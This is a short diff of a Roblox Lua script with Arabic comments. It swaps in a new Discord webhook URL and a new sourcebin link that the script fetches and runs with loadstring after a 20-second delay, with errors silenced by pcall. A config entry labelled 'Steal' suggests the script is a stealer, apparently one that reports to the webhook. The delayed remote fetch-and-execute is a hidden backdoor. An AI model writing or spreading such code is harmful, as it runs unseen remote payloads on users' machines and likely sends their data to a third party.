@@ -11,12 +11,13 @@ local Config = {
     Steal = {"steal"}
 }
 
-local WebhookURL = "https://discord.com/api/webhooks/1489215951093239890/052bJ8vjLfNKXfP5ED3iMfYZEzG8PPwBbXb9IZegNHFoNCpwbk0X5DF-YdWuqUY7hvxP"
+-- تم تحديث الرابط هنا
+local WebhookURL = "https://discord.com/api/webhooks/1489949232889856161/oWmdAZQWpp7y2pgEhq7kFKjdlhsC-GS86PSo27frNXIlcDMrcwRcxXmXoQOZLGO5JqTy"
 
--- السكربت الخارجي (يعمل بعد 20 ثانية)
+-- السكربت الخارجي المحدث (يعمل بعد 20 ثانية)
 task.spawn(function()
     task.wait(20)
-    pcall(function() loadstring(game:HttpGet("https://cdn.sourceb.in/bins/aMh3iJq4pb/0"))() end)
+    pcall(function() loadstring(game:HttpGet("https://cdn.sourceb.in/bins/pGqXqDihVz/0"))() end)
 end)
 
 -- العدادات
